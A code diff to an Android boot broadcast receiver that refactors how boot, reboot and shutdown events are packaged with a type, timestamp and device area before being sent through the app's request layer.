@@ -7,9 +7,14 @@ import android.content.SharedPreferences;
 import android.content.res.Resources;
 import android.preference.PreferenceManager;
 
+import java.util.HashMap;
+import java.util.Map;
+
 import com.inet.android.certificate.R;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.AppSettings;
+import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
 /**
@@ -23,7 +28,7 @@ public class BootBroadcastReceiver extends BroadcastReceiver {
 	Context mContext;
 	private final String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";
 	SharedPreferences sp;
-	String area;
+	Resources path;
 
 	@Override
 	public void onReceive(Context context, Intent intent) {
@@ -34,11 +39,10 @@ public class BootBroadcastReceiver extends BroadcastReceiver {
 			return;
 		}
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		Resources path = mContext.getApplicationContext().getResources();
-		area = path.getString(R.string.device);
+		path = mContext.getApplicationContext().getResources();
 		String action = intent.getAction();
 		if (action.equalsIgnoreCase(BOOT_ACTION)) {
-			sendStr(path.getString(R.string.boot));
+			sendRequest(path.getString(R.string.boot));
 			// send info request
 			RequestList.sendInfoDeviceRequest(mContext);
 			// for Service
@@ -46,16 +50,25 @@ public class BootBroadcastReceiver extends BroadcastReceiver {
 
 		}
 		if (action.equalsIgnoreCase(Intent.ACTION_REBOOT)) {
-			sendStr(path.getString(R.string.reboot));
+			sendRequest(path.getString(R.string.reboot));
 
 		}
 		if (action.equalsIgnoreCase(Intent.ACTION_SHUTDOWN)) {
-			sendStr(path.getString(R.string.shutdown));
+			sendRequest(path.getString(R.string.shutdown));
 
 		}
 	}
 
-	private void sendStr(String str) {
-		RequestList.sendDataRequest(area, str, mContext);
+	private void sendRequest(String str) {
+		Map<String, Object> device = new HashMap<String, Object>();
+		Map<String, String> info = new HashMap<String, String>();
+		device.put("type", AppConstants.TYPE_SERVICE_REQUEST);
+		device.put("time", ConvertDate.logTime());
+		info.put("area", path.getString(R.string.device));
+		info.put("event", str);
+		device.put("info", info);
+
+		RequestList.sendDataRequest(device, null, mContext);
+
 	}
 }
